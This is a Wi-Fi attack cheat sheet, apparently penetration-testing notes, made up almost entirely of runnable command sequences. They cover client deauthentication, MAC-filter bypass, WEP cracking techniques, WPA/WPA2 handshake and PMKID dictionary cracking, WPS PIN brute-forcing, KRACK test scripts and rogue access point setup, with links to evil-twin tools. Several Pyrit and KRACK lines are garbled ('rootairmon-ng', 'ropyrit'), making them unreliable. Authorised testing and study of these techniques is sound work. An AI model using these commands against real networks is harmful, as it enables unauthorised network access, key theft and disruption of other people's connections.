# ⭕ Attacks

## <mark style="color:red;">Monitoring</mark>

Set a wireless network interface to the monitoring mode:

```
airmon-ng start wlan0

ifconfig wlan0 down && iwconfig wlan0 mode monitor && ifconfig wlan0 up
```

Set a wireless network interface to the monitoring mode on a specified channel:

```
airmon-ng start wlan0 8

iwconfig wlan0 channel 8
```

\[Optional] Kill services that might interfere with wireless network interfaces in the monitoring mode:

```
airmon-ng check kill
```

Set a wireless network interface back to the managed mode:

```
airmon-ng stop wlan0mon

ifconfig wlan0 down && iwconfig wlan0 mode managed && ifconfig wlan0 up
```

Search for WiFi networks within your range:

```
airodump-ng --wps -w airodump_sweep_results wlan0mon

wash -a -i wlan0mon
```

\[Optional] Install `reaver/wash` on WiFi Pineapple Mark VII:

```
opkg update && opkg install libpcap reaver
```

\[Optional] Install `reaver/wash` on WiFi Pineapple Nano:

```
opkg update && opkg install libpcap && opkg -d sd install wash
```

Monitor a WiFi network to capture handshakes/requests:

```
airodump-ng wlan0mon --channel 8 -w airodump_essid_results --essid essid --bssid FF:FF:FF:FF:FF:FF
```

If you specified the output file, don't forget to stop `airodump-ng` after you are done monitoring because it will fill up all your free storage space with a large PCAP file.

Use [Kismet](https://github.com/ivan-sincek/evil-twin#additional-kismet) or WiFi Pineapple to find more information about wireless access points, e.g. their MAC address, vendor's name, etc.

## <mark style="color:red;">Find Hidden SSIDs</mark>

```
airmon-ng start wlan0
airodump-ng -c <Channel> --bssid <BSSID> wlan0mon
aireplay-ng -0 20 -a <BSSID> -c <VictimMac> wlan0mon 
```

## <mark style="color:red;">Bypass MAC Filtering</mark>

```
airmon-ng start wlan0
airodump-ng -c <AP_Channel> --bssid <BSSID> -w <FileName> wlan0mon
aireplay-ng -0 10 --a <BSSID> -c <VictimMac> wlan0mon
ifconfig wlan0mon down
macchanger --mac <VictimMac> wlan0mon
ifconfig wlan0mon up
aireplay-ng -3 -b <BSSID> -h <FakedMac> wlan0mon
```

## <mark style="color:red;">Cracking</mark>

Check if a wireless interface supports packet injection:

```
aireplay-ng --test wlan1 -e essid -a FF:FF:FF:FF:FF:FF
```

### <mark style="color:orange;">WPA/WPA2 Handshake</mark>

Monitor a WiFi network to capture a WPA/WPA2 4-way handshake:

```
airodump-ng wlan0mon --channel 8 -w airodump_essid_results --essid essid --bssid FF:FF:FF:FF:FF:FF
```

\[Optional] Deauthenticate clients from a WiFi network:

```
aireplay-ng --deauth 10 wlan1 -e essid -a FF:FF:FF:FF:FF:FF
```

Start the dictionary attack against a WPA/WPA2 handshake:

```
aircrack-ng -e essid -b FF:FF:FF:FF:FF:FF -w rockyou.txt airodump_essid_results*.cap
```

### <mark style="color:orange;">PMKID Attack</mark>

Crack the WPA/WPA2 authentication without deauthenticating clients.

Install the required set of tools on Kali Linux:

```
apt-get update && apt-get -y install hcxtools
```

\[Optional] Install the required tool on WiFi Pineapple Mark VII:

```
opkg update && opkg install hcxdumptool
```

\[Optional] Install the required tool on WiFi Pineapple Nano:

```
opkg update && opkg -d sd install hcxdumptool
```

Start capturing PMKID hashes for all nearby networks:

```
hcxdumptool --enable_status=1 -o hcxdumptool_results.cap -i wlan0mon
```

\[Optional] Start capturing PMKID hashes for specified WiFi networks:

```
echo HH:HH:HH:HH:HH:HH | sed 's/\://g' >> filter.txt

hcxdumptool --enable_status=1 -o hcxdumptool_results.cap -i wlan0mon --filterlist_ap=filter.txt --filtermode=2
```

Sometimes it can take hours to capture a single PMKID hash.

Extract PMKID hashes from a PCAP file:

```
hcxpcaptool hcxdumptool_results.cap -k hashes.txt
```

Start the dictionary attack against PMKID hashes:

```
hashcat -m 16800 -a 0 --session=cracking --force --status -O -o hashcat_results.txt hashes.txt rockyou.txt
```

Find out more about Hashcat from my other [project](https://github.com/ivan-sincek/penetration-testing-cheat-sheet#hashcat).

## <mark style="color:red;">WEP Attacks</mark>

### <mark style="color:orange;">Fake Authentication Attack</mark>

```
airmon-ng start wlan0
airodump-ng -c <AP_Channel> --bssid <BSSID> -w <FileName> wlan0mon
#What’s my mac?
macchanger --show wlan0mon
aireplay-ng -1 0 -a <BSSID> -h <OurMac> -e <ESSID> wlan0mon
aireplay-ng -2 -p 0841 -c FF:FF:FF:FF:FF:FF -b <BSSID> -h <OurMac> wlan0mon
aircrack-ng -b <BSSID> <PCAP_of_FileName>
```

### <mark style="color:orange;">ARP Replay Attack</mark>

```
airmon-ng start wlan0
airodump-ng -c <AP_Channel> --bssid <BSSID> -w <FileName> wlan0mon
#What’s my mac?
macchanger --show wlan0mon
aireplay-ng -3 -x 1000 -n 1000 -b <BSSID> -h <OurMac> wlan0mon
aircrack-ng -b <BSSID> <PCAP_of_FileName>
```

### <mark style="color:orange;">Chop Chop Attack</mark>

```
airmon-ng start wlan0
airodump-ng -c <AP_Channel> --bssid <BSSID> -w <FileName> wlan0mon
#What’s my mac?
macchanger --show wlan0mon
aireplay-ng -1 0 -e <ESSID> -a <BSSID> -h <OurMac> wlan0mon
aireplay-ng -4 -b <BSSID> -h <OurMac> wlan0mon
 #Press ‘y’ ;
packetforge-ng -0 -a <BSSID> -h <OurMac> -k <SourceIP> -l <DestinationIP> -y <XOR_PacketFile> -w <FileName2>
aireplay-ng -2 -r <FileName2> wlan0mon
aircrack-ng <PCAP_of_FileName>
```

### <mark style="color:orange;">Fragmentation Attack</mark>

```
airmon-ng start wlan0
airodump-ng -c <AP_Channel> --bssid <BSSID> -w <FileName> wlan0mon
#What’s my mac?
macchanger --show wlan0mon
aireplay-ng -1 0 -e <ESSID> -a <BSSID> -h <OurMac> wlan0mon
aireplay-ng -5 -b <BSSID> -h < OurMac > wlan0mon
#Press 'y' ;
packetforge-ng -0 -a <BSSID> -h < OurMac > -k <SourceIP> -l <DestinationIP> -y <XOR_PacketFile> -w <FileName2>
aireplay-ng -2 -r <FileName2> wlan0mon
aircrack-ng <PCAP_of_FileName>
```

### <mark style="color:orange;">SKA (Shared Key Authentication) Type Cracking</mark>

```
airmon-ng start wlan0
airodump-ng -c <AP_Channel> --bssid <BSSID> -w <FileName> wlan0mon
aireplay-ng -0 10 -a <BSSID> -c <VictimMac> wlan0mon
ifconfig wlan0mon down
macchanger --mac <VictimMac> wlan0mon
ifconfig wlan0mon up
aireplay-ng -3 -b <BSSID> -h <FakedMac> wlan0mon
aireplay-ng --deauth 1 -a <BSSID> -h <FakedMac> wlan0mon
aircrack-ng <PCAP_of_FileName>
```

## <mark style="color:red;">WPA / WPA2 Attacks</mark>

### <mark style="color:orange;">WPS Attack</mark>

```
airmon-ng start wlan0
apt-get install reaver
wash -i wlan0mon -C
reaver -i wlan0mon -b <BSSID> -vv -S
#or, Specific attack
reaver -i -c <Channel> -b <BSSID> -p <PinCode> -vv -S
```

```
# Crack a WPS PIN:
reaver -vv --pixie-dust -i wlan1 -c 8 -e essid -b FF:FF:FF:FF:FF:FF

# Crack a WPS PIN with some delay between attempts:
reaver -vv --pixie-dust -N -L -d 5 -r 3:15 -T 0.5 -i wlan1 -c 8 -e essid -b FF:FF:FF:FF:FF:FF
```

### <mark style="color:orange;">KRACK Attack</mark>

{% embed url="https://github.com/NoahhhRyan/krackattacks-test" %}

{% embed url="https://rootsaid.com/krack-test" %}

```
apt-get update apt-get install libnl-3-dev libnl-genl-3-dev pkg-config libssl-dev net-tools git sysfsutils python-scapy python-pycryptodome
git clone https://github.com/NoahhhRyan/krackattacks-test.git
cd krackattacks-test-research cd krackattacks
chmod 777 krack-ft-test.py
chmod 777 disable-hwcrypto.sh
./disable-hwcrypto.sh
python krack-ft-test.py

# Set the network.conf file, in the directory, 
# you need to change the “testnet” in it to the wifi name you
#  want to attack, the password is arbitrary, and it is saved in
# the suite directory

sudo wpa_supplicant -D nl80211 -i wlan0 -c network.conf
```

{% embed url="https://www.krackattacks.com/#demo" %}

{% embed url="https://githubhelp.com/Scr561/krackattacks-scripts" %}

### <mark style="color:orange;">Enterprise Attacks</mark>

{% embed url="https://www.offensive-security.com/penetration-testing/hacking-wpa-enterprise-with-kali-linux" %}

{% embed url="https://www.contextis.com/en/blog/attacking-and-defending-wpa-enterprise-networks" %}

{% embed url="https://resources.infosecinstitute.com/topic/attacking-wpa2-enterprise" %}

{% embed url="https://pentest.blog/attacking-wpa-enterprise-wireless-network" %}

### <mark style="color:orange;">Dictionary Attack</mark>

```
airmon-ng start wlan0
airodump-ng -c <AP_Channel> --bssid <BSSID> -w <FileName> wlan0mon
aireplay-ng -0 1 -a <BSSID> -c <VictimMac> wlan0mon
aircrack-ng -w <WordlistFile> -b <BSSID> <Handshaked_PCAP>
```

### <mark style="color:orange;">crack with Hashcat</mark>

```
airmon-ng
airmon-ng start wlx000f00313c95
airodump-ng wlan1mon -c 11
airodump-ng wlan1mon -c 11 --bssid 48:EE:0C:8E:D0:5C -w /root/hp/
aireplay-ng -0 0 -a 48:EE:0C:8E:D0:5C  wlan1mon

# convert pcap to  hccapx
https://hashcat.net/cap2hccapx/

apt install hashcat-utils
crunch 8 8 1234567890 | hashcat -m 22000  18081_1596091404.hccapx --status  -o cracked.txt
```

### <mark style="color:orange;">Crack with John The Ripper</mark>

```
airmon-ng start wlan0
airodump-ng -c <Channel> --bssid <BSSID> -w <FileName> wlan0mon
aireplay-ng -0 1 -a <BSSID> -c <VictimMac> wlan0mon
cd /pentest/passwords/john
john -wordlist=<Wordlist> --rules -stdout|aircrack-ng -0 -e <ESSID> -w - <PCAP_of_FileName>
```

### <mark style="color:orange;">Crack with coWPAtty</mark>

```
airmon-ng start wlan0
airodump-ng -c <Channel> --bssid <BSSID> -w <FileName> wlan0mon
aireplay-ng -0 1 -a <BSSID> -c <VictimMac> wlan0mon
cowpatty -r <FileName> -f <Wordlist> -2 -s <SSID>
genpmk -s <SSID> -f <Wordlist> -d <HashesFileName>
cowpatty -r <PCAP_of_FileName> -d <HashesFileName> -2 -s <SSID>
```

### <mark style="color:orange;">Crack with Pyrit</mark>

```
rootairmon-ng start wlan0
rooairodump-ng -c <Channel> --bssid <BSSID> -w <FileName> wlan0mon
rootaireplay-ng -0 1 -a <BSSID> -c <VictimMac> wlan0mon
ropyrit -r<PCAP_of_FileName> -b <BSSID> -i <Wordlist> attack_passthrough
ropyrit -i <Wordlist> import_passwords
ropyrit -e <ESSID> create_essid
rootpyrit batch
rootpyrit -r <PCAP_of_FileName> attack_db
```

### <mark style="color:orange;">Precomputed WPA Keys Database Attack</mark>

```
airmon-ng start wlan0
airodump-ng -c <AP_Channel> --bssid <BSSID> -w <FileName> wlan0mon
aireplay-ng -0 1 -a <BSSID> -c <VictimMac> wlan0mon
kwrite ESSID.txt
airolib-ng NEW_DB --import essid ESSID.txt
airolib-ng NEW_DB --import passwd <DictionaryFile>
airolib-ng NEW_DB --clean all
airolib-ng NEW_DB --stats
airolib-ng NEW_DB --batch
airolib-ng NEW_DB --verify all
aircrack-ng -r NEW_DB <Handshaked_PCAP>
```

## <mark style="color:red;">WPA3 Attacks</mark>

### <mark style="color:orange;">DragonBlood Attack</mark>

{% embed url="https://wpa3.mathyvanhoef.com" %}

{% embed url="https://github.com/vanhoefm/dragonslayer" %}

{% embed url="https://github.com/vanhoefm/dragondrain-and-time" %}

{% embed url="https://github.com/vanhoefm/dragondrain-and-time" %}

{% embed url="https://www.youtube.com/watch?v=msTugNs8bnM" %}

## <mark style="color:red;">Rogue AP</mark>

```
airmon-ng start wlan0
airbase-ng -e “<FakeBSSID>” wlan0mon
brctl addbr <VariableName>
brctl addif <VariableName> wlan0mon
brctl addif <VariableName> at0
ifconfig eth0 0.0.0.0 up
ifconfig at0 0.0.0.0 up
ifconfig <VariableName> up
aireplay-ng -deauth 0 -a <victimBSSID> wlan0mon
dhclient3 <VariableName> &
wireshark &
;select <VariableName> interface
```

{% embed url="https://github.com/wifiphisher/wifiphisher" %}

{% embed url="https://www.google.com/url?cad=rja&cd=&esrc=s&q=&rct=j&sa=t&source=web&uact=8&url=https%3A%2F%2Fwww.offensive-security.com%2Fmetasploit-unleashed%2Fkarmetasploit%2F&usg=AOvVaw2_l8dd98aP2Nq-viqO4BZy&ved=2ahUKEwi7qczmlvX1AhVUhv0HHc5cBQoQFnoECAYQAQ" %}

{% embed url="https://github.com/P0cL4bs/wifipumpkin3" %}

## <mark style="color:red;">Evil Twin</mark>

{% embed url="https://github.com/thehackingsage/fluxion" %}

{% embed url="https://livelinuxusb.com/how-to-perform-an-evil-twin-attack-with-airgeddon" %}

{% embed url="https://dev.to/athanstan/evil-twin-attack-example-on-kali-linux-55jk" %}
